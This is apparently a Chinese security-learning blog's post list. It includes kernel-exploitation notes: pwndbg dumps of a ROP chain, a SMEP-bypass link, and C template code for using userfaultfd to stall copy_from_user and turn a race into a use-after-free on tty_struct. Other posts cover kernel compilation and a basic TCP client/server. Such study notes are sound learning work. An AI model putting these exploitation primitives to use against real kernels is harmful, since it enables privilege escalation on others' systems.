<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">00:0000│ rsp 0xffffb9b480223e70 ◂— 0</span><br><span class="line">01:0008│     0xffffb9b480223e78 —▸ 0xffffffffade9cce0 ◂— push   rbp</span><br><span class="line">02:0010│     0xffffb9b480223e80 —▸ 0xffffffffadea0f49 ◂— pop    rdx</span><br><span class="line">03:0018│     0xffffb9b480223e88 —▸ 0xffffffffade21e53 ◂— pop    rcx</span><br><span class="line">04:0020│     0xffffb9b480223e90 —▸ 0xffffffffade1aa6a ◂— mov    rdi, rax</span><br><span class="line">05:0028│     0xffffb9b480223e98 —▸ 0xffffffffade9c8e0 ◂— push   r12</span><br><span class="line">06:0030│     0xffffb9b480223ea0 —▸ 0xffffffffae8012da ◂— swapgs </span><br><span class="line">07:0038│     0xffffb9b480223ea8 ◂— 0</span><br><span class="line">───────────────────────────────────────────────────────────[ BACKTRACE ]───────────────────────────────────────────────────────────</span><br><span class="line"> ► f 0 0xffffffffade00b2f</span><br><span class="line">   f 1              0x0</span><br><span class="line">───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">pwndbg&gt; tele 0xffffffffadea0f49</span><br><span class="line">00:0000│  0xffffffffadea0f49 ◂— pop    rdx</span><br><span class="line">01:0008│  0xffffffffadea0f51 ◂— mov    eax, dword ptr [rsi]</span><br><span class="line">02:0010│  0xffffffffadea0f59 ◂— movabs al, byte ptr [0xbe83e8b48000003]</span><br><span class="line">03:0018│  0xffffffffadea0f61 ◂— or     eax, dword ptr [rbx]</span><br><span class="line">04:0020│  0xffffffffadea0f69 ◂— add    byte ptr [rax], al</span><br><span class="line">05:0028│  0xffffffffadea0f71 ◂— push   rsi</span><br><span class="line">06:0030│  0xffffffffadea0f79 ◂— push   rbp</span><br><span class="line">07:0038│  0xffffffffadea0f81 ◂— push   rbx</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; tele 0xffffffffade1aa6a</span><br><span class="line">00:0000│  0xffffffffade1aa6a ◂— mov    rdi, rax</span><br><span class="line">01:0008│  0xffffffffade1aa72 ◂— mov    rax, qword ptr [rbx]</span><br><span class="line">02:0010│  0xffffffffade1aa7a ◂— call   0xffffffffae66be50</span><br><span class="line">03:0018│  0xffffffffade1aa82 ◂— or     byte ptr [rcx], dh</span><br><span class="line">04:0020│  0xffffffffade1aa8a ◂— pop    rbp</span><br><span class="line">05:0028│  0xffffffffade1aa92 ◂— nop    dword ptr [rax]</span><br><span class="line">06:0030│  0xffffffffade1aa9a ◂— test   byte ptr [rax], al</span><br><span class="line">07:0038│  0xffffffffade1aaa2 ◂— nop    dword ptr [rax]</span><br></pre></td></tr></table></figure>

<h3 id="bypass-smep"><a href="#bypass-smep" class="headerlink" title="bypass smep"></a>bypass smep</h3><p><a target="_blank" rel="noopener" href="https://chowdera.com/2022/04/202204142053592614.html">https://chowdera.com/2022/04/202204142053592614.html</a></p>
<h3 id="userfaultfd"><a href="#userfaultfd" class="headerlink" title="userfaultfd"></a>userfaultfd</h3><p>userfaultfd并不是利用机制，而是Linux内核编程中为了更灵活留给开发者使用处理缺页异常的机制。开发者(用户)可以自定义事件来处理这种事(缺页)。<em><strong>在处理函数结束之前，缺页发生的位置(线程)将处于暂停状态，这将非常有助于条件竞争的利用</strong></em></p>
<p>当然，本意是为了提升开发的灵活性，在kernel pwn中常被用于提高条件竞争的成功率。</p>
<p><font color=red>比如</font></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">if(ptr)</span><br><span class="line">&#123;</span><br><span class="line">	...</span><br><span class="line">	copy_from_user(kptr, user_buf, size);</span><br><span class="line">	...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>当我们进行<code>copy_from_user(kptr, user_buf, size);</code>这个kptr指针被发现在我们的非映射区域，按理说不就直接报缺页错误吗？但是，说了提高开的灵活性，可以允许开发者自己写处理函数进行处理。在这个处理函数运行期间，该线程是一直被暂停的，知道处理函数结束。在这暂停期间，我们课另开一个线程，将<code>kptr</code>释放掉，将其他结构(比如tty_struct)申请到这里，当却也处理结束以后，<code>copy_from_suer</code>恢复执行，但此时<code>kptr</code>是指向<code>tty_struct</code>的，那就可以对<code>tty_struct</code>进行修改。</p>
<p>其效果，也就是我们常说的UAF</p>
<p>(当然，其实没有这个机制也可以，只是可能成功率会低一些，好吧，其实是低很多。)，制造条件竞争造成UAF。</p>
<p>具体</p>
<p>注册userfaultfd</p>
<p>网上大佬的模板，很多，但是好像都大差不差。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">ErrExit</span><span class="params">(<span class="type">char</span>* err_msg)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">puts</span>(err_msg);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);<span class="comment">//exit when it is wrong</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">RegisterUserfault</span><span class="params">(<span class="type">void</span> *fault_page,<span class="type">void</span> *handler)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">pthread_t</span> thr;<span class="comment">//we need a thread at first</span></span><br><span class="line">    <span class="comment">//we need two struct to do something</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_api</span> <span class="title">ua</span>;</span><span class="comment">//the api struct we need to store the the &#x27;api&#x27;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_register</span> <span class="title">ur</span>;</span><span class="comment">//the register struct we need to store some information about our register func</span></span><br><span class="line">    <span class="type">uint64_t</span> uffd  = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);<span class="comment">//return the fd about the userfault</span></span><br><span class="line">    ua.api = UFFD_API;</span><br><span class="line">    ua.features = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (ioctl(uffd, UFFDIO_API, &amp;ua) == <span class="number">-1</span>)</span><br><span class="line">        ErrExit(<span class="string">&quot;[-] ioctl-UFFDIO_API&quot;</span>);</span><br><span class="line"></span><br><span class="line">    ur.range.start = (<span class="type">unsigned</span> <span class="type">long</span>)fault_page; <span class="comment">//我们要监视的区域</span></span><br><span class="line">    ur.range.len   = PAGE_SIZE;<span class="comment">//the size of the page</span></span><br><span class="line">    ur.mode        = UFFDIO_REGISTER_MODE_MISSING;<span class="comment">//what would it do if the page is missing</span></span><br><span class="line">    <span class="keyword">if</span> (ioctl(uffd, UFFDIO_REGISTER, &amp;ur) == <span class="number">-1</span>) <span class="comment">//注册缺页错误处理</span></span><br><span class="line">        <span class="comment">//当发生缺页时，程序会阻塞，此时，我们在另一个线程里操作</span></span><br><span class="line">        ErrExit(<span class="string">&quot;[-] ioctl-UFFDIO_REGISTER&quot;</span>);</span><br><span class="line">    <span class="comment">//开一个线程，接收错误的信号，然后处理</span></span><br><span class="line">    <span class="type">int</span> s = pthread_create(&amp;thr, <span class="literal">NULL</span>,handler, (<span class="type">void</span>*)uffd);<span class="comment">//link the thread(who), handler(how to do) and the uffd(with whom) </span></span><br><span class="line">    <span class="keyword">if</span> (s!=<span class="number">0</span>)</span><br><span class="line">        ErrExit(<span class="string">&quot;[-] pthread_create&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>我们注册的时候，使用</p>
<p><code>RegisterUserfault(mmap_buf,handler);</code>，就可以将<code>handler</code>函数绑定到<code>mmap_buf</code>,当<code>mmap_buf</code>出现缺页异常时就会调用<code>handler</code>来处理。</p>
<p>关于<code>handler</code>的写法</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span>* <span class="title function_">userfaultfd_leak_handler</span><span class="params">(<span class="type">void</span>* arg)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffd_msg</span> <span class="title">msg</span>;</span><span class="comment">//to store the wrong message</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> uffd = (<span class="type">unsigned</span> <span class="type">long</span>) arg;<span class="comment">//the arg points to the target</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pollfd</span> <span class="title">pollfd</span>;</span></span><br><span class="line">    <span class="type">int</span> nready;</span><br><span class="line">    pollfd.fd = uffd;</span><br><span class="line">    pollfd.events = POLLIN;</span><br><span class="line">    nready = poll(&amp;pollfd, <span class="number">1</span>, <span class="number">-1</span>);<span class="comment">//the func always be waiting for the signal</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>定义一个<code>uffd_msg</code>类型的结构在未来接收消息。</p>
<p>定义一个<code>pollfd</code>类型的结构体提供轮询操作，其<code>fd</code>设置为传入的<code>arg</code>,<code>event</code>设置为POLLIN,然后执行<code>poll&amp;(pollfd, 1, -1);</code>来进行轮询，这个函数会一直进行轮询，知道缺页错误出现。</p>
<p>当缺页出现后处理缺页。</p>
<p>如下</p>
<p>开头的<code>sleep</code>操作就可以实现我们暂停线程的操作，然后在这个暂停期间我们<code>mmap</code>一个页(因为他不是缺页吗)</p>
<p>注意：在<code>mmap</code>时，如果自己有缺页错误，它会有自己的处理函数(托底)，所以不会无限套娃循环下去。</p>
<p>其实，在这里，我们就差不多完成我们的目的，即让线程暂停下来。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">    sleep(<span class="number">3</span>);</span><br><span class="line">    <span class="keyword">if</span> (nready != <span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        ErrExit(<span class="string">&quot;[-] Wrong poll return val&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    nready = read(uffd, &amp;msg, <span class="keyword">sizeof</span>(msg));</span><br><span class="line">    <span class="keyword">if</span> (nready &lt;= <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        ErrExit(<span class="string">&quot;[-] msg err&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span>* page = (<span class="type">char</span>*) mmap(<span class="literal">NULL</span>, PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (page == MAP_FAILED)</span><br><span class="line">    &#123;</span><br><span class="line">        ErrExit(<span class="string">&quot;[-] mmap err&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_copy</span> <span class="title">uc</span>;</span></span><br><span class="line">    <span class="comment">// init page</span></span><br><span class="line">    <span class="built_in">memset</span>(page, <span class="number">0</span>, <span class="keyword">sizeof</span>(page));</span><br><span class="line">    uc.src = (<span class="type">unsigned</span> <span class="type">long</span>) page;</span><br><span class="line">    uc.dst = (<span class="type">unsigned</span> <span class="type">long</span>) msg.arg.pagefault.address &amp; ~(PAGE_SIZE - <span class="number">1</span>);</span><br><span class="line">    uc.len = PAGE_SIZE;</span><br><span class="line">    uc.mode = <span class="number">0</span>;</span><br><span class="line">    uc.copy = <span class="number">0</span>;</span><br><span class="line">    ioctl(uffd, UFFDIO_COPY, &amp;uc);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] leak handler done&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ca</p>

            
        </div>
    </div>
    <div class="post-tags">
        
        
        
    </div>
    <a href="/2023/03/25/kernel/" class="go-post">阅读全文</a>
</div>

<div class="post">
    <a href="/2023/03/22/kernel%E4%B8%8B%E8%BD%BD%E4%B8%8E%E7%BC%96%E8%AF%91/">
        <h2 class="post-title">kernel下载和编译</h2>
    </a>
    <div class="category-and-date">
        
        <span class="date">
            <span class="icon">
                <i class="fa-solid fa-calendar fa-fw"></i>
            </span>
            2023/3/22
        </span>
        
        
    </div>
    <div class="description">
        <div class="content" v-pre>
            
            <p>内核源码编译</p>
<h3 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h3><p><a target="_blank" rel="noopener" href="https://www.kernel.org/">源码下载</a></p>
<img src="./../pictures/kernel/image-20240102144055344.png" alt="image-20240102144055344" style="zoom:50%;" />

<p>选择长期支持版</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wget https://cdn.kernel.org/pub/linux/kernel/v5.x/linux-**.tar.xz</span><br><span class="line">unxz linux-**.tar.xz</span><br><span class="line">tar -xf linux-**.tar</span><br></pre></td></tr></table></figure>

<p>注意：在ubuntu下编译可能会要求证书或签名。</p>
<p><a target="_blank" rel="noopener" href="https://stackoverflow.com/questions/67670169/compiling-kernel-gives-error-no-rule-to-make-target-debian-certs-debian-uefi-ce">如果要求证书</a></p>
<h3 id="编译配置"><a href="#编译配置" class="headerlink" title="编译配置"></a>编译配置</h3><p>先配置选项</p>
<p>依赖包</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install bc binutils bison dwarves flex gcc git gnupg2 gzip libelf-dev libncurses5-dev libssl-dev make openssl pahole perl-base rsync tar xz-utils</span><br></pre></td></tr></table></figure>



<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make menuconfig</span><br></pre></td></tr></table></figure>

<p>这里我们主要关注调试方面的选项，依次进入到 Kernel hacking -&gt; Compile-time checks and compiler options，然后勾选如下选项<code>Compile the kernel with debug info</code>，以便于调试（不过似乎现在是默认开启的）。<br>如果要使用 kgdb 调试内核，则需要选中 <code>KGDB: kernel debugger</code>，并选中 KGDB 下的<u>所有</u>选项。</p>
<h3 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h3><p>编译内核镜像，可以根据机器的核数来选择具体使用多少核来编译内核</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make -j3 bzImage</span><br></pre></td></tr></table></figure>

<p>注意，这条命令只编译内核的镜像，如果要测试并编译自己的驱动程序是不够的。</p>
<p>需执行以下命令</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make -j3 all</span><br></pre></td></tr></table></figure>

<p>期间如果有没有缺少依赖包的报错，自行安装就是。</p>
<p>最后编译成功后。</p>
<ul>
<li>bzImage：<code>arch/x86/boot/bzImage</code></li>
<li>vmlinux：源码所在的根目录下。</li>
</ul>
<p>此外，这里给出常见内核文件的介绍。</p>
<ul>
<li><strong>bzImage</strong>：目前主流的 kernel 镜像格式，即 big zImage（即 bz 不是指 bzip2），适用于较大的（大于 512 KB） Kernel。这个镜像会被加载到内存的高地址，高于 1MB。bzImage 是用 gzip 压缩的，文件的开头部分有 gzip 解压缩的代码，所以我们不能用 gunzip 来解压缩。</li>
<li><strong>zImage</strong>：比较老的 kernel 镜像格式，适用于较小的（不大于 512KB） Kernel。启动时，这个镜像会被加载到内存的低地址，即内存的前 640 KB。zImage 也不能用 gunzip 来解压缩。</li>
<li><strong>vmlinuz</strong>：vmlinuz 不仅包含了压缩后的 vmlinux，还包含了 gzip 解压缩的代码。实际上就是 zImage 或者 bzImage 文件。该文件是 bootable 的。 bootable 是指它能够把内核加载到内存中。对于 Linux 系统而言，该文件位于 &#x2F;boot 目录下。该目录包含了启动系统时所需要的文件。</li>
<li><strong>vmlinux</strong>：静态链接的 Linux kernel，以可执行文件的形式存在，尚未经过压缩。该文件往往是在生成 vmlinuz 的过程中产生的。该文件适合于调试。但是该文件不是 bootable 的。</li>
<li><strong>vmlinux.bin</strong>：也是静态链接的 Linux kernel，只是以一个可启动的 (bootable) 二进制文件存在。所有的符号信息和重定位信息都被删除了。生成命令为：<code>objcopy -O binary vmlinux vmlinux.bin</code>。</li>
<li><strong>uImage</strong>：uImage 是 U-boot 专用的镜像文件，它是在 zImage 之前加上了一个长度为 0x40 的 tag 而构成的。这个 tag 说明了这个镜像文件的类型、加载位置、生成时间、大小等信息。</li>
</ul>

            
        </div>
    </div>
    <div class="post-tags">
        
        
        
    </div>
    <a href="/2023/03/22/kernel%E4%B8%8B%E8%BD%BD%E4%B8%8E%E7%BC%96%E8%AF%91/" class="go-post">阅读全文</a>
</div>

<div class="post">
    <a href="/2022/09/19/linux%20%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/">
        <h2 class="post-title">linux网络编程</h2>
    </a>
    <div class="category-and-date">
        
        <span class="date">
            <span class="icon">
                <i class="fa-solid fa-calendar fa-fw"></i>
            </span>
            2022/9/19
        </span>
        
        
    </div>
    <div class="description">
        <div class="content" v-pre>
            
            <p>client</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PORT 28000</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_BUFFER_SIZE 1024</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> client_socket;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">server_addr</span>;</span></span><br><span class="line">    <span class="type">char</span> buffer[MAX_BUFFER_SIZE];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 创建客户端套接字</span></span><br><span class="line">    client_socket = socket(AF_INET, SOCK_STREAM, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (client_socket == <span class="number">-1</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;Error creating socket&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 设置服务器地址结构</span></span><br><span class="line">    server_addr.sin_family = AF_INET;</span><br><span class="line">    server_addr.sin_addr.s_addr = inet_addr(<span class="string">&quot;150.158.21.50&quot;</span>);</span><br><span class="line">    server_addr.sin_port = htons(PORT);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 尝试连接到服务器</span></span><br><span class="line">    <span class="keyword">if</span> (connect(client_socket, (<span class="keyword">struct</span> sockaddr*)&amp;server_addr, <span class="keyword">sizeof</span>(server_addr)) == <span class="number">-1</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;Error connecting to server&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Connected to server\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 发送和接收数据</span></span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="comment">// 输入消息</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Enter message: &quot;</span>);</span><br><span class="line">        fgets(buffer, <span class="keyword">sizeof</span>(buffer), <span class="built_in">stdin</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 发送数据</span></span><br><span class="line">        <span class="type">ssize_t</span> bytes_sent = send(client_socket, buffer, <span class="built_in">strlen</span>(buffer), <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span> (bytes_sent == <span class="number">-1</span>) &#123;</span><br><span class="line">            perror(<span class="string">&quot;Error sending data&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 接收数据</span></span><br><span class="line">        <span class="type">ssize_t</span> bytes_received = recv(client_socket, buffer, <span class="keyword">sizeof</span>(buffer), <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span> (bytes_received &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">            perror(<span class="string">&quot;Error receiving data&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 在接收到的数据后添加字符串结束符</span></span><br><span class="line">        buffer[bytes_received] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Server response: %s&quot;</span>, buffer);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 关闭套接字</span></span><br><span class="line">    close(client_socket);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>





<p>server</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PORT 28000</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BUFFER_SIZE 1024</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> server_socket, client_socket;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">server_address</span>, <span class="title">client_address</span>;</span></span><br><span class="line">    <span class="type">char</span> buffer[BUFFER_SIZE] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 创建服务器套接字</span></span><br><span class="line">    <span class="keyword">if</span> ((server_socket = socket(AF_INET, SOCK_STREAM, <span class="number">0</span>)) == <span class="number">-1</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;Socket creation failed&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 设置服务器地址结构</span></span><br><span class="line">    server_address.sin_family = AF_INET;</span><br><span class="line">    server_address.sin_addr.s_addr = INADDR_ANY;</span><br><span class="line">    server_address.sin_port = htons(PORT);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 将服务器套接字绑定到指定地址和端口</span></span><br><span class="line">    <span class="keyword">if</span> (bind(server_socket, (<span class="keyword">struct</span> sockaddr *)&amp;server_address, <span class="keyword">sizeof</span>(server_address)) == <span class="number">-1</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;Bind failed&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 监听连接请求</span></span><br><span class="line">    <span class="keyword">if</span> (listen(server_socket, <span class="number">3</span>) == <span class="number">-1</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;Listen failed&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Server listening on port %d...\n&quot;</span>, PORT);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 接受连接</span></span><br><span class="line">    <span class="keyword">if</span> ((client_socket = accept(server_socket, (<span 